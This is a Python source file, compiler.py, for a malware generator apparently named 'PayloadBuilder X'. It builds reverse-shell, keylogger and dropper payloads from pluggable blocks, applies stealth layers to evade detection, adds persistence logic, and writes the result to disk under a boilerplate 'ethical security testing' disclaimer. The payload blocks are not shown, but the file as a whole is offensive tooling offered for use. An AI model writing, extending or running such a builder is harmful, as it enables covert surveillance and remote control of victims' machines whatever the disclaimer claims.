# builder/compiler.py

from pathlib import Path
from datetime import datetime
import uuid
from builder import loader, mode_utils

class CompileError(Exception):
    pass

def _normalize_list(val):
    if not val:
        return []
    if isinstance(val, list):
        return val
    return [v.strip() for v in str(val).replace(",", " ").split() if v.strip()]

def compile_payload(spec):
    """
    Full payload compiler. Returns the path to the generated .py or .pbx file.
    """

    print("[*] Discovering payload blocks...")
    loader.discover_blocks()

    # === 1. Load base payload block ===
    print("[*] Loading base block...")
    base_code = _build_base(spec)
    print("[+] Base block built.")

    # === 2. Apply stealth layers ===
    print("[*] Applying stealth...")
    code = _apply_stealth(base_code, spec)

    # === 3. Apply persistence logic ===
    print("[*] Applying persistence...")
    code = _apply_persistence(code, spec)

    # === 4. Output ===
    output_path = spec.get("output_path", "./output")
    extension = "py" if spec.get("build_mode", "debug") != "release" else "pbx"
    filename = mode_utils.get_filename(spec, extension=extension)
    full_path = Path(output_path) / filename
    Path(output_path).mkdir(parents=True, exist_ok=True)

    # === Insert watermark ===
    watermark = _build_watermark(spec)
    final_code = f"{watermark}\n{code}"

    print(f"[*] Writing output to: {full_path}")
    with open(full_path, "w") as f:
        f.write(final_code)

    print(f"[✓] Payload successfully built: {full_path}")
    return str(full_path.resolve())

def _build_base(spec):
    fn = loader.get_block(
        spec["payload_type"],
        platform=spec["platform"],
        language=spec["language"],
        variant=spec.get("variant", "default")
    )
    if not fn:
        raise CompileError(f"No block found for: {spec['payload_type']}")

    if spec["payload_type"] == "reverse_shell":
        return fn(spec["LHOST"], int(spec["LPORT"]))
    elif spec["payload_type"] == "keylogger":
        return fn()
    elif spec["payload_type"] == "dropper":
        return fn(filename=spec["filename"])
    else:
        return fn(**spec)

def _apply_stealth(code, spec):
    for stealth in _normalize_list(spec.get("stealth")):
        if stealth in ("", "none"):
            continue

        fn = loader.get_block(
            name=stealth,
            platform="all",
            language=spec["language"],
            variant="default"
        )
        if fn:
            print(f"[*] Applying stealth module: {stealth}")
            code = fn(code)
    return code

def _apply_persistence(code, spec):
    persist = spec.get("persistence", "none")
    if persist in ("", "none"):
        return code

    fn = loader.get_block(
        name=persist,
        platform=spec["platform"],
        language=spec["language"],
        variant="default"
    )
    if fn:
        print(f"[*] Applying persistence: {persist}")
        return fn(code, **spec)
    return code

def _build_watermark(spec):
    tag = spec.get("build_tag") or uuid.uuid4().hex[:8]
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    lines = [
        "# =============================================",
        "#  PayloadBuilder X – Ethical Security Testing Payload",
        f"#  Build ID     : {tag}",
        f"#  Generated on : {now}",
        "#",
        "#  IMPORTANT NOTICE:", 
        "#  This payload is provided strictly for educational use and",
        "#  authorized security testing **with the explicit, written consent**",
        "#  of the system owner. Unauthorized use is strictly prohibited and",
        "#  may violate applicable laws.",
        "#",
        "#  By using this code, you acknowledge that:",
        "#    - You have obtained proper authorization for any deployment.",
        "#    - You assume full responsibility for its use and consequences.",
        "#    - PayloadBuilder X and its contributors disclaim all liability",
        "#      for any misuse, direct or indirect damages, or legal outcomes.",
        "#",
        "#  DO NOT remove this header. Use of this code without permission",
        "#  may be illegal.",
        "# =============================================\n"
    ]
    return "\n".join(lines)
